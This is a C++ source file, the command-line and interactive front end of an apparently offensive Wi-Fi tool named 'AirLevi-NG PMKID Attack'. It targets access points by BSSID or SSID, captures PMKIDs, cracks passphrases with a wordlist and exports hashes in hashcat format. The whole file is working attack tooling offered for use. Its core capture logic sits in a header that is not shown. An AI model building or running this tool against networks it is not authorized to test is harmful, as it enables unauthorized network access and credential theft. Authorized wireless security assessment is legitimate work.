#include "airlevi-pmkid/pmkid_attack.h"
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <signal.h>
#include <unistd.h>
#include <cstdio>

PMKIDAttack* g_attack = nullptr;

static bool parseMacString(const std::string& mac_str, MacAddress& out) {
    unsigned int b[6];
    if (std::sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) return false;
    for (int i = 0; i < 6; ++i) out.bytes[i] = static_cast<uint8_t>(b[i] & 0xFF);
    return true;
}

void signalHandler(int signum) {
    if (g_attack) {
        std::cout << "\n[!] Stopping attack..." << std::endl;
        g_attack->stopAttack();
    }
    exit(0);
}

void printUsage(const std::string& program_name) {
    std::cout << "AirLevi-NG PMKID Attack Tool v1.0\n";
    std::cout << "Usage: " << program_name << " [OPTIONS]\n\n";
    std::cout << "Required:\n";
    std::cout << "  -i <interface>     Monitor mode interface\n\n";
    std::cout << "Optional:\n";
    std::cout << "  -b <bssid>         Target specific BSSID\n";
    std::cout << "  -e <ssid>          Target specific SSID\n";
    std::cout << "  -c <channel>       Set specific channel (no hopping)\n";
    std::cout << "  -C                 Enable channel hopping (default)\n";
    std::cout << "  -d <ms>            Channel dwell time in ms (default: 250)\n";
    std::cout << "  -w <wordlist>      Wordlist for cracking\n";
    std::cout << "  -o <file>          Output file for results\n";
    std::cout << "  -f <format>        Export format (csv, hashcat)\n";
    std::cout << "  -t <timeout>       Attack timeout in seconds\n";
    std::cout << "  -h                 Show this help\n\n";
    std::cout << "Examples:\n";
    std::cout << "  " << program_name << " -i wlan0mon\n";
    std::cout << "  " << program_name << " -i wlan0mon -b 00:11:22:33:44:55 -w wordlist.txt\n";
    std::cout << "  " << program_name << " -i wlan0mon -C -d 500 -o results.csv\n";
}

void displayInteractiveHelp() {
    std::cout << "\n╔══════════════════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                          Interactive Commands                                ║\n";
    std::cout << "╠══════════════════════════════════════════════════════════════════════════════╣\n";
    std::cout << "║ status, s          - Show current status and statistics                     ║\n";
    std::cout << "║ targets, t         - List discovered targets                                ║\n";
    std::cout << "║ results, r         - Show captured PMKIDs and cracking results             ║\n";
    std::cout << "║ channel <ch>       - Switch to specific channel                            ║\n";
    std::cout << "║ hop <on/off>       - Enable/disable channel hopping                        ║\n";
    std::cout << "║ target <bssid>     - Set target BSSID                                      ║\n";
    std::cout << "║ wordlist <file>    - Set wordlist for cracking                             ║\n";
    std::cout << "║ export <file>      - Export results to file                                ║\n";
    std::cout << "║ clear              - Clear screen                                           ║\n";
    std::cout << "║ help, h            - Show this help                                        ║\n";
    std::cout << "║ quit, q, exit      - Stop attack and exit                                  ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════════════════════╝\n";
}

void runInteractiveMode(PMKIDAttack& attack) {
    std::string input;
    std::vector<std::string> tokens;
    
    std::cout << "\n[+] Interactive mode started. Type 'help' for commands.\n";
    
    while (true) {
        std::cout << "\nairlevi-pmkid> ";
        std::getline(std::cin, input);
        
        if (input.empty()) continue;
        
        // Parse command
        tokens.clear();
        std::istringstream iss(input);
        std::string token;
        while (iss >> token) {
            tokens.push_back(token);
        }
        
        if (tokens.empty()) continue;
        
        std::string cmd = tokens[0];
        std::transform(cmd.begin(), cmd.end(), cmd.begin(), ::tolower);
        
        if (cmd == "quit" || cmd == "q" || cmd == "exit") {
            break;
        }
        else if (cmd == "help" || cmd == "h") {
            displayInteractiveHelp();
        }
        else if (cmd == "status" || cmd == "s") {
            attack.displayStatus();
        }
        else if (cmd == "targets" || cmd == "t") {
            auto targets = attack.getTargets();
            std::cout << "\n[+] Discovered Targets (" << targets.size() << "):\n";
            for (const auto& target : targets) {
                auto last_seen = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - target.last_seen).count();
                std::cout << "  " << target.bssid.toString() 
                         << " (" << target.ssid << ") "
                         << "CH:" << (int)target.channel 
                         << " Signal:" << target.signal_strength << "dBm "
                         << "Last:" << last_seen << "s ago\n";
            }
        }
        else if (cmd == "results" || cmd == "r") {
            auto results = attack.getResults();
            std::cout << "\n[+] PMKID Results (" << results.size() << "):\n";
            for (const auto& result : results) {
                std::cout << "  " << result.bssid.toString() 
                         << " (" << result.ssid << ") ";
                if (!result.passphrase.empty()) {
                    std::cout << "CRACKED: " << result.passphrase;
                } else {
                    std::cout << "PMKID: " << result.pmkid_hex.substr(0, 32) << "...";
                }
                std::cout << "\n";
            }
        }
        else if (cmd == "channel" && tokens.size() >= 2) {
            try {
                uint8_t channel = std::stoi(tokens[1]);
                attack.setChannel(channel);
                std::cout << "[+] Switched to channel " << (int)channel << std::endl;
            } catch (const std::exception& e) {
                std::cout << "[-] Invalid channel number" << std::endl;
            }
        }
        else if (cmd == "hop" && tokens.size() >= 2) {
            std::string mode = tokens[1];
            std::transform(mode.begin(), mode.end(), mode.begin(), ::tolower);
            if (mode == "on" || mode == "true" || mode == "1") {
                attack.setChannelHopping(true);
                std::cout << "[+] Channel hopping enabled" << std::endl;
            } else if (mode == "off" || mode == "false" || mode == "0") {
                attack.setChannelHopping(false);
                std::cout << "[+] Channel hopping disabled" << std::endl;
            } else {
                std::cout << "[-] Use 'hop on' or 'hop off'" << std::endl;
            }
        }
        else if (cmd == "target" && tokens.size() >= 2) {
            MacAddress bssid;
            if (!parseMacString(tokens[1], bssid)) {
                std::cout << "[-] Invalid BSSID format" << std::endl;
            } else {
                attack.setTargetBSSID(bssid);
                std::cout << "[+] Target BSSID set to " << bssid.toString() << std::endl;
            }
        }
        else if (cmd == "wordlist" && tokens.size() >= 2) {
            attack.setWordlist(tokens[1]);
            std::cout << "[+] Wordlist set to " << tokens[1] << std::endl;
        }
        else if (cmd == "export" && tokens.size() >= 2) {
            std::string format = "csv";
            if (tokens.size() >= 3) {
                format = tokens[2];
            }
            
            ExportFormat fmt = ExportFormat::CSV;
            if (format == "hashcat") {
                fmt = ExportFormat::HASHCAT;
            }
            
            attack.exportResults(tokens[1], fmt);
        }
        else if (cmd == "clear") {
            system("clear");
        }
        else {
            std::cout << "[-] Unknown command: " << cmd << ". Type 'help' for available commands." << std::endl;
        }
    }
}

int main(int argc, char* argv[]) {
    std::string interface;
    std::string target_bssid;
    std::string target_ssid;
    std::string wordlist;
    std::string output_file;
    std::string export_format = "csv";
    uint8_t channel = 0;
    bool channel_hopping = true;
    int dwell_time = 250;
    int timeout = 0;
    
    // Parse command line arguments
    int opt;
    while ((opt = getopt(argc, argv, "i:b:e:c:Cd:w:o:f:t:h")) != -1) {
        switch (opt) {
            case 'i':
                interface = optarg;
                break;
            case 'b':
                target_bssid = optarg;
                break;
            case 'e':
                target_ssid = optarg;
                break;
            case 'c':
                channel = std::atoi(optarg);
                channel_hopping = false;
                break;
            case 'C':
                channel_hopping = true;
                break;
            case 'd':
                dwell_time = std::atoi(optarg);
                break;
            case 'w':
                wordlist = optarg;
                break;
            case 'o':
                output_file = optarg;
                break;
            case 'f':
                export_format = optarg;
                break;
            case 't':
                timeout = std::atoi(optarg);
                break;
            case 'h':
            default:
                printUsage(argv[0]);
                return 1;
        }
    }
    
    if (interface.empty()) {
        std::cerr << "[-] Interface is required. Use -i <interface>" << std::endl;
        printUsage(argv[0]);
        return 1;
    }
    
    // Check if running as root
    if (geteuid() != 0) {
        std::cerr << "[-] This tool requires root privileges" << std::endl;
        return 1;
    }
    
    // Setup signal handlers
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    // Create and initialize attack
    PMKIDAttack attack;
    g_attack = &attack;
    
    std::cout << "╔══════════════════════════════════════════════════════════════════════════════╗\n";
    std::cout << "║                            AirLevi-NG PMKID Attack                          ║\n";
    std::cout << "║                                  v1.0                                       ║\n";
    std::cout << "╚══════════════════════════════════════════════════════════════════════════════╝\n\n";
    
    if (!attack.initialize(interface)) {
        std::cerr << "[-] Failed to initialize attack on interface " << interface << std::endl;
        return 1;
    }
    
    // Configure attack
    if (!target_bssid.empty()) {
        MacAddress bssid;
        if (!parseMacString(target_bssid, bssid)) {
            std::cerr << "[-] Invalid BSSID format: " << target_bssid << std::endl;
            return 1;
        }
        attack.setTargetBSSID(bssid);
    }
    
    if (!target_ssid.empty()) {
        attack.setTargetSSID(target_ssid);
    }
    
    if (channel > 0) {
        attack.setChannel(channel);
    }
    
    attack.setChannelHopping(channel_hopping, dwell_time);
    
    if (!wordlist.empty()) {
        attack.setWordlist(wordlist);
    }
    
    // Start attack
    if (!attack.startAttack()) {
        std::cerr << "[-] Failed to start attack" << std::endl;
        return 1;
    }
    
    // Handle timeout or interactive mode
    if (timeout > 0) {
        std::cout << "[+] Running for " << timeout << " seconds..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(timeout));
        
        attack.stopAttack();
        
        // Export results if specified
        if (!output_file.empty()) {
            ExportFormat fmt = ExportFormat::CSV;
            if (export_format == "hashcat") {
                fmt = ExportFormat::HASHCAT;
            }
            attack.exportResults(output_file, fmt);
        }
        
        // Display final statistics
        PMKIDStats stats = attack.getStats();
        std::cout << "\n[+] Attack completed!" << std::endl;
        std::cout << "    Runtime: " << stats.runtime_seconds << " seconds" << std::endl;
        std::cout << "    Packets sent: " << stats.packets_sent << std::endl;
        std::cout << "    PMKIDs captured: " << stats.pmkids_captured << std::endl;
        std::cout << "    Targets found: " << stats.targets_found << std::endl;
        std::cout << "    Cracked: " << stats.cracked_count << std::endl;
    } else {
        // Interactive mode
        runInteractiveMode(attack);
        attack.stopAttack();
        
        // Export results if specified
        if (!output_file.empty()) {
            ExportFormat fmt = ExportFormat::CSV;
            if (export_format == "hashcat") {
                fmt = ExportFormat::HASHCAT;
            }
            attack.exportResults(output_file, fmt);
        }
    }
    
    std::cout << "\n[+] AirLevi-NG PMKID Attack finished." << std::endl;
    return 0;
}
